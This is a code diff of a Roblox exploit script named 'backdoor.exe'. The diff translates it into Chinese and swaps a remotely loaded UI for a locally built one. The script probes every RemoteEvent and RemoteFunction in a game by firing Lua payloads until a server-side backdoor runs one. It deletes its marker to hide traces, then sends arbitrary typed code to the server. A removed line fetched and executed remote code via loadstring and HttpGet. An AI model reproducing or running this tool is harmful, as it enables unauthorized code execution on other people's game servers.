@@ -1,4 +1,4 @@
--- Services
+-- 服务
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local Lighting = game:GetService("Lighting");
@@ -7,11 +7,11 @@ local JointsService = game:GetService("JointsService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
 
--- Variables
+-- 变量
 local LocalPlayer = Players.LocalPlayer
 local RobloxGui = CoreGui.RobloxGui
 
--- Functions
+-- 函数
 local dateTimeNow = DateTime.now
 local tableFind = table.find
 local taskSpawn = task.spawn
@@ -19,145 +19,413 @@ local taskWait = task.wait
 local stringRep = string.rep
 local mathRandom = math.random
 
--- Globals
+-- 全局变量
 local attached = false;
 local backdoor = nil;
 local commonPlaces = {
-	ReplicatedStorage,
-	Workspace,
-	Lighting
+        ReplicatedStorage,
+        Workspace,
+        Lighting
 };
 local remoteCodes = {};
 
--- Constants
+-- 常量
 local INV_CODE = "xJHCqm84cW";
 local STRING_VALUE_NAME = mathRandom(1000000, 9999999);
 
 
-if RobloxGui:FindFirstChild("V6") then RobloxGui:FindFirstChild("V6"):Destroy(); print("Refreshed"); end
-local Variables = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/ui.lua"))()
+if RobloxGui:FindFirstChild("V6") then RobloxGui:FindFirstChild("V6"):Destroy(); print("已刷新"); end
 
-Variables.UI.Main.Active = true
-Variables.UI.Main.Draggable = true
+-- 创建主UI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "V6由XTTT修改"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
+-- 主框架
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "Main"
+MainFrame.Size = UDim2.new(0, 450, 0, 360)
+MainFrame.Position = UDim2.new(0.5, -225, 0.5, -175)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+-- 圆角
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = MainFrame
+
+-- 标题栏
+local TitleBar = Instance.new("Frame")
+TitleBar.Name = "Topbar"
+TitleBar.Size = UDim2.new(1, 0, 0, 30)
+TitleBar.Position = UDim2.new(0, 0, 0, 0)
+TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TitleBar.BorderSizePixel = 0
+
+local TitleBarCorner = Instance.new("UICorner")
+TitleBarCorner.CornerRadius = UDim.new(0, 8)
+TitleBarCorner.Parent = TitleBar
+
+-- 标题文字
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Name = "Title"
+TitleLabel.Size = UDim2.new(0.6, 0, 1, 0)
+TitleLabel.Position = UDim2.new(0, 10, 0, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "后门.exe"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Font = Enum.Font.Gotham
+TitleLabel.TextSize = 14
+
+-- 状态显示
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Name = "Status"
+StatusLabel.Size = UDim2.new(0.3, 0, 1, 0)
+StatusLabel.Position = UDim2.new(0.6, 0, 0, 0)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "未连接"
+StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+StatusLabel.TextXAlignment = Enum.TextXAlignment.Right
+StatusLabel.Font = Enum.Font.Gotham
+StatusLabel.TextSize = 12
+
+-- 状态指示器
+local StatusCircle = Instance.new("Frame")
+StatusCircle.Name = "Circle"
+StatusCircle.Size = UDim2.new(0, 8, 0, 8)
+StatusCircle.Position = UDim2.new(0.92, 0, 0.5, -4)
+StatusCircle.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+StatusCircle.BorderSizePixel = 0
+
+local StatusCircleCorner = Instance.new("UICorner")
+StatusCircleCorner.CornerRadius = UDim.new(1, 0)
+StatusCircleCorner.Parent = StatusCircle
+
+-- 关闭按钮
+local CloseButton = Instance.new("TextButton")
+CloseButton.Name = "CloseButton"
+CloseButton.Size = UDim2.new(0, 20, 0, 20)
+CloseButton.Position = UDim2.new(1, -25, 0, 5)
+CloseButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+CloseButton.BorderSizePixel = 0
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.TextSize = 12
+
+local CloseButtonCorner = Instance.new("UICorner")
+CloseButtonCorner.CornerRadius = UDim.new(0, 4)
+CloseButtonCorner.Parent = CloseButton
+
+-- R6按钮
+local R6Button = Instance.new("TextButton")
+R6Button.Name = "R6Button"
+R6Button.Size = UDim2.new(0, 20, 0, 20)
+R6Button.Position = UDim2.new(1, -50, 0, 5)
+R6Button.BackgroundColor3 = Color3.fromRGB(80, 80, 160)
+R6Button.BorderSizePixel = 0
+R6Button.Text = "R6"
+R6Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+R6Button.Font = Enum.Font.Gotham
+R6Button.TextSize = 10
+
+local R6ButtonCorner = Instance.new("UICorner")
+R6ButtonCorner.CornerRadius = UDim.new(0, 4)
+R6ButtonCorner.Parent = R6Button
+
+-- 按钮容器
+local ButtonsFrame = Instance.new("Frame")
+ButtonsFrame.Name = "MainButtons"
+ButtonsFrame.Size = UDim2.new(1, -20, 0, 40)
+ButtonsFrame.Position = UDim2.new(0, 10, 0, 40)
+ButtonsFrame.BackgroundTransparency = 1
+
+-- 扫描按钮
+local ScanButton = Instance.new("TextButton")
+ScanButton.Name = "ScanButton"
+ScanButton.Size = UDim2.new(0.18, 0, 1, 0)
+ScanButton.Position = UDim2.new(0, 0, 0, 0)
+ScanButton.BackgroundColor3 = Color3.fromRGB(60, 60, 160)
+ScanButton.BorderSizePixel = 0
+ScanButton.Text = "扫描"
+ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScanButton.Font = Enum.Font.Gotham
+ScanButton.TextSize = 12
+
+local ScanButtonCorner = Instance.new("UICorner")
+ScanButtonCorner.CornerRadius = UDim.new(0, 4)
+ScanButtonCorner.Parent = ScanButton
+
+-- 执行按钮
+local ExecuteButton = Instance.new("TextButton")
+ExecuteButton.Name = "ExecuteButton"
+ExecuteButton.Size = UDim2.new(0.18, 0, 1, 0)
+ExecuteButton.Position = UDim2.new(0.2, 0, 0, 0)
+ExecuteButton.BackgroundColor3 = Color3.fromRGB(60, 160, 60)
+ExecuteButton.BorderSizePixel = 0
+ExecuteButton.Text = "执行"
+ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteButton.Font = Enum.Font.Gotham
+ExecuteButton.TextSize = 12
+
+local ExecuteButtonCorner = Instance.new("UICorner")
+ExecuteButtonCorner.CornerRadius = UDim.new(0, 4)
+ExecuteButtonCorner.Parent = ExecuteButton
+
+-- 清空按钮
+local ClearButton = Instance.new("TextButton")
+ClearButton.Name = "ClearButton"
+ClearButton.Size = UDim2.new(0.18, 0, 1, 0)
+ClearButton.Position = UDim2.new(0.4, 0, 0, 0)
+ClearButton.BackgroundColor3 = Color3.fromRGB(160, 160, 60)
+ClearButton.BorderSizePixel = 0
+ClearButton.Text = "清空"
+ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ClearButton.Font = Enum.Font.Gotham
+ClearButton.TextSize = 12
+
+local ClearButtonCorner = Instance.new("UICorner")
+ClearButtonCorner.CornerRadius = UDim.new(0, 4)
+ClearButtonCorner.Parent = ClearButton
+
+-- 隐藏按钮
+local HideButton = Instance.new("TextButton")
+HideButton.Name = "HideButton"
+HideButton.Size = UDim2.new(0.18, 0, 1, 0)
+HideButton.Position = UDim2.new(0.6, 0, 0, 0)
+HideButton.BackgroundColor3 = Color3.fromRGB(160, 100, 60)
+HideButton.BorderSizePixel = 0
+HideButton.Text = "隐藏"
+HideButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+HideButton.Font = Enum.Font.Gotham
+HideButton.TextSize = 12
+
+local HideButtonCorner = Instance.new("UICorner")
+HideButtonCorner.CornerRadius = UDim.new(0, 4)
+HideButtonCorner.Parent = HideButton
+
+-- 邀请按钮
+local InviteButton = Instance.new("TextButton")
+InviteButton.Name = "InviteButton"
+InviteButton.Size = UDim2.new(0.18, 0, 1, 0)
+InviteButton.Position = UDim2.new(0.8, 0, 0, 0)
+InviteButton.BackgroundColor3 = Color3.fromRGB(120, 60, 160)
+InviteButton.BorderSizePixel = 0
+InviteButton.Text = "邀请"
+InviteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+InviteButton.Font = Enum.Font.Gotham
+InviteButton.TextSize = 12
+
+local InviteButtonCorner = Instance.new("UICorner")
+InviteButtonCorner.CornerRadius = UDim.new(0, 4)
+InviteButtonCorner.Parent = InviteButton
+
+-- 脚本输入区域
+local SourceFrame = Instance.new("Frame")
+SourceFrame.Name = "SourceFrame"
+SourceFrame.Size = UDim2.new(1, -20, 0, 260)
+SourceFrame.Position = UDim2.new(0, 10, 0, 90)
+SourceFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+SourceFrame.BorderSizePixel = 0
+
+local SourceFrameCorner = Instance.new("UICorner")
+SourceFrameCorner.CornerRadius = UDim.new(0, 6)
+SourceFrameCorner.Parent = SourceFrame
+
+-- 滚动框 - 这是修复的关键部分
+local ScrollingFrame = Instance.new("ScrollingFrame")
+ScrollingFrame.Name = "ScrollingFrame"
+ScrollingFrame.Size = UDim2.new(1, -10, 1, -10)
+ScrollingFrame.Position = UDim2.new(0, 5, 0, 5)
+ScrollingFrame.BackgroundTransparency = 1
+ScrollingFrame.BorderSizePixel = 0
+ScrollingFrame.ScrollBarThickness = 8
+ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(120, 120, 120)
+ScrollingFrame.VerticalScrollBarInset = Enum.ScrollBarInset.Always
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y -- 自动调整画布大小
+
+-- 文本框
+local SourceTextBox = Instance.new("TextBox")
+SourceTextBox.Name = "Source"
+SourceTextBox.Size = UDim2.new(1, 0, 1, 0)
+SourceTextBox.Position = UDim2.new(0, 0, 0, 0)
+SourceTextBox.BackgroundTransparency = 1
+SourceTextBox.Text = "print('Hello World!')"
+SourceTextBox.TextColor3 = Color3.fromRGB(220, 220, 220)
+SourceTextBox.TextXAlignment = Enum.TextXAlignment.Left
+SourceTextBox.TextYAlignment = Enum.TextYAlignment.Top
+SourceTextBox.Font = Enum.Font.Code
+SourceTextBox.TextSize = 12
+SourceTextBox.TextWrapped = false
+SourceTextBox.MultiLine = true
+SourceTextBox.TextTruncate = Enum.TextTruncate.None
+SourceTextBox.ClearTextOnFocus = false
+
+-- 组装UI
+SourceTextBox.Parent = ScrollingFrame
+ScrollingFrame.Parent = SourceFrame
+ScanButton.Parent = ButtonsFrame
+ExecuteButton.Parent = ButtonsFrame
+ClearButton.Parent = ButtonsFrame
+HideButton.Parent = ButtonsFrame
+InviteButton.Parent = ButtonsFrame
+ButtonsFrame.Parent = MainFrame
+SourceFrame.Parent = MainFrame
+TitleLabel.Parent = TitleBar
+StatusLabel.Parent = TitleBar
+StatusCircle.Parent = TitleBar
+CloseButton.Parent = TitleBar
+R6Button.Parent = TitleBar
+TitleBar.Parent = MainFrame
+MainFrame.Parent = ScreenGui
+ScreenGui.Parent = RobloxGui
+
+-- 创建Variables表以保持兼容性
+local Variables = {
+    UI = ScreenGui,
+    Topbar = {
+        CloseButton = CloseButton,
+        R6Button = R6Button,
+        Status = StatusLabel
+    },
+    MainButtons = {
+        ScanButton = ScanButton,
+        ExecuteButton = ExecuteButton,
+        ClearButton = ClearButton,
+        HideButton = HideButton,
+        InviteButton = InviteButton
+    },
+    SourceFrame = {
+        Source = SourceTextBox
+    }
+}
+
+-- 原有的功能函数保持不变
 local function notify(text,cb,b1,b2)
-	game:GetService("StarterGui"):SetCore(
-		"SendNotification",{
-			Title = "backdoor.exe",
-			Duration = 3,
-			Text = text,
-			Callback = cb,
-			Button1 = b1,
-			Button2 = b2
-		}
-	)
+        game:GetService("StarterGui"):SetCore(
+                "SendNotification",{
+                        Title = "后门.exe",
+                        Duration = 3,
+                        Text = text,
+                        Callback = cb,
+                        Button1 = b1,
+                        Button2 = b2
+                }
+        )
 end
 
 local function validRemote(rm)
-	local Parent = rm.Parent
-	local class = rm.ClassName
-	if class ~= "RemoteEvent" and class ~= "RemoteFunction" then return false end
+        local Parent = rm.Parent
+        local class = rm.ClassName
+        if class ~= "RemoteEvent" and class ~= "RemoteFunction" then return false end
 
-	if Parent then
-		if Parent == JointsService then return false end
-		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
+        if Parent then
+                if Parent == JointsService then return false end
+                if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
         (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
-	end
+        end
 
-	if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
+        if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
 
-	return true
+        return true
 end
 
 local function scanDescendants(parent)
-	local descendance = parent:GetDescendants();
-	for i=1, #descendance do
-		local descendant = descendance[i];
+        local descendance = parent:GetDescendants();
+        for i=1, #descendance do
+                local descendant = descendance[i];
 
 
-		if not validRemote(descendant) then continue; end
-		
-		--if #remoteCodes == 5 then remoteCodes.clear(); end
-		local remoteCode = tostring(mathRandom(100000, 999999));
-		remoteCodes[remoteCode] = descendant;
-		
-		local remoteClass = descendant.ClassName
-		local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)
+                if not validRemote(descendant) then continue; end
 
-		if remoteClass == "RemoteEvent" then
-			descendant:FireServer(requireScript)
+                --if #remoteCodes == 5 then remoteCodes.clear(); end
+                local remoteCode = tostring(mathRandom(100000, 999999));
+                remoteCodes[remoteCode] = descendant;
 
-		elseif remoteClass == "RemoteFunction" then
-			local waiting = true
-			taskSpawn(function()
-				descendant:InvokeServer(requireScript)
-				waiting = nil
-			end)
+                local remoteClass = descendant.ClassName
+                local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)
 
-            -- If RemoteFunction don't respond in 1 second, we skip this one.
-			local start = dateTimeNow().UnixTimestampMillis
-			while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
-				taskWait()
-			end
-		end
+                if remoteClass == "RemoteEvent" then
+                        descendant:FireServer(requireScript)
 
-		if Workspace:FindFirstChild(STRING_VALUE_NAME) then
-			attached = true
-			backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
-			backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME)) -- Cleaning up after tonumberselves
+                elseif remoteClass == "RemoteFunction" then
+                        local waiting = true
+                        taskSpawn(function()
+                                descendant:InvokeServer(requireScript)
+                                waiting = nil
+                        end)
 
-			return true
-		end
-	end
+            -- 如果RemoteFunction在1秒内没有响应，我们跳过这个
+                        local start = dateTimeNow().UnixTimestampMillis
+                        while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
+                                taskWait()
+                        end
+                end
+
+                if Workspace:FindFirstChild(STRING_VALUE_NAME) then
+                        attached = true
+                        backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
+                        backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME)) -- 清理我们自己的痕迹
+
+                        return true
+                end
+        end
 end
+
 local function scanGame()
     local found = false
-	-- Scan Common Places
-	for i=1, #commonPlaces do
-		local place = commonPlaces[i];
-		if scanDescendants(place) then
+        -- 扫描常见位置
+        for i=1, #commonPlaces do
+                local place = commonPlaces[i];
+                if scanDescendants(place) then
             found = true
         end
-	end
-	-- Scan the rest of the game
-	local children = game:GetChildren();
-	for i=1, #children do
-		local child = children[i];
-		-- We ofcourse don't need to check the common places again, do we?
-		if tableFind(commonPlaces, child) then continue; end
-		
-		if scanDescendants(child) then 
+        end
+        -- 扫描游戏的其他部分
+        local children = game:GetChildren();
+        for i=1, #children do
+                local child = children[i];
+                -- 我们当然不需要再次检查常见位置，对吧？
+                if tableFind(commonPlaces, child) then continue; end
+
+                if scanDescendants(child) then 
             found = true
         end
-	end
+        end
     if found then
-        notify("Backdoor Found!")
-        Variables.Topbar.Status.Text = "Attached"
-        Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(95, 185, 47)
+        notify("找到后门!")
+        Variables.Topbar.Status.Text = "已连接"
+        StatusCircle.BackgroundColor3 = Color3.fromRGB(95, 185, 47)
     else
-        notify("Unable to find backdoor!")
-        Variables.Topbar.Status.Text = "Failed"
+        notify("无法找到后门!")
+        Variables.Topbar.Status.Text = "失败"
     end
 
-	return found;
+        return found;
 end
+
 local function executeScript(script)
     if not attached then
         local function callback(text)
-			if text == "Yes" then
-				if scanGame() then
-				    executeScript(script)
-				end
-			elseif text == "No" then
-				return
-			end
-		end
-	
-		local bf = Instance.new("BindableFunction"); bf.OnInvoke = callback
-		notify("You're not attached.\nWould you like to attach now?", bf, "Yes", "No")
-		return
+                        if text == "是" then
+                                if scanGame() then
+                                    executeScript(script)
+                                end
+                        elseif text == "否" then
+                                return
+                        end
+                end
+
+                local bf = Instance.new("BindableFunction"); bf.OnInvoke = callback
+                notify("您尚未连接。\n现在要连接吗？", bf, "是", "否")
+                return
     end
-    
+
     local script = script or Variables.SourceFrame.Source.Text
     if backdoor.ClassName == "RemoteEvent" then
         backdoor:FireServer(script)
@@ -166,16 +434,12 @@ local function executeScript(script)
     end
 end
 
-
-
-
-
 local function promtDiscordInvite()
     local httpService = game:GetService("HttpService")
     local httpRequest = (syn and syn.request) or (httpService and httpService.request) or http_request
 
-    if not httpRequest then setclipboard(INV_CODE) notify("Invite code copied!") return end
-    
+    if not httpRequest then setclipboard(INV_CODE) notify("邀请码已复制!") return end
+
     local request = httpRequest({
         Url = "http://127.0.0.1:6463/rpc?v=1",
         Method = "POST",
@@ -192,67 +456,29 @@ local function promtDiscordInvite()
         })
     })
 
-	if request.StatusCode ~= 200 or httpService:JSONDecode(request.Body).data.code == 4011 then
-	    notify("Invite code copied!") 
-		setclipboard(INV_CODE)
-		return
-	end
-	
-	notify("You have been promted to join our Discord. Open your Discord.")
+        if request.StatusCode ~= 200 or httpService:JSONDecode(request.Body).data.code == 4011 then
+            notify("邀请码已复制!") 
+                setclipboard(INV_CODE)
+                return
+        end
+
+        notify("您已被邀请加入我们的Discord。请打开您的Discord。")
 
 end
 
+-- 连接按钮事件
 Variables.Topbar.CloseButton.MouseButton1Click:Connect(function() Variables.UI:Destroy() end)
 Variables.Topbar.R6Button.MouseButton1Click:Connect(function() executeScript(("require(3041175937):r6('%s')"):format(LocalPlayer.Name)) end)
 Variables.MainButtons.ScanButton.MouseButton1Click:Connect(scanGame)
 Variables.MainButtons.ExecuteButton.MouseButton1Click:Connect(executeScript)
 Variables.MainButtons.ClearButton.MouseButton1Click:Connect(function() Variables.SourceFrame.Source.Text = "" end)
-Variables.MainButtons.HideButton.MouseButton1Click:Connect(function() Variables.SourceFrame.Source.Visible = not Variables.SourceFrame.Source.Visible end)
+Variables.MainButtons.HideButton.MouseButton1Click:Connect(function() 
+    SourceFrame.Visible = not SourceFrame.Visible 
+end)
 Variables.MainButtons.InviteButton.MouseButton1Click:Connect(promtDiscordInvite)
--- 在脚本末尾添加这个修复
-wait(1)
-if Variables.SourceFrame and Variables.SourceFrame.Source then
-    local sourceBox = Variables.SourceFrame.Source
-    
-    -- 首先确保我们有滚动条
-    sourceBox.ScrollBarThickness = 10
-    sourceBox.TextWrapped = true
-    
-    -- 找到包含文本框的ScrollingFrame
-    local scrollingFrame = sourceBox:FindFirstAncestorOfClass("ScrollingFrame")
-    if scrollingFrame then
-        -- 修复ScrollingFrame的CanvasSize
-        local function updateScrollingFrame()
-            wait(0.1)
-            -- 计算文本高度
-            local textHeight = sourceBox.TextBounds.Y
-            -- 设置ScrollingFrame的CanvasSize为文本高度加上一些边距
-            scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, textHeight + 100)
-        end
-        
-        -- 初始设置
-        updateScrollingFrame()
-        
-        -- 文本变化时更新
-        sourceBox:GetPropertyChangedSignal("Text"):Connect(updateScrollingFrame)
-        
-        -- 添加一个强制滚动到底部的按钮
-        local scrollButton = Instance.new("TextButton")
-        scrollButton.Size = UDim2.new(0, 120, 0, 25)
-        scrollButton.Position = UDim2.new(1, -125, 1, -30)
-        scrollButton.Text = "滚动到底部"
-        scrollButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-        scrollButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-        scrollButton.Parent = scrollingFrame
-        
-        scrollButton.MouseButton1Click:function()
-            scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.CanvasSize.Y.Offset)
-        end
-    else
-        -- 如果没有找到ScrollingFrame，直接操作文本框
-        sourceBox:GetPropertyChangedSignal("Text"):Connect(function()
-            wait(0.1)
-            sourceBox.CanvasPosition = Vector2.new(0, sourceBox.TextBounds.Y + 100)
-        end)
-    end
-end
+
+-- 确保文本框内容变化时滚动框能正确调整
+Variables.SourceFrame.Source:GetPropertyChangedSignal("Text"):Connect(function()
+    -- 这会自动触发滚动框的AutomaticCanvasSize
+    wait() -- 等待一帧确保文本已渲染
+end)
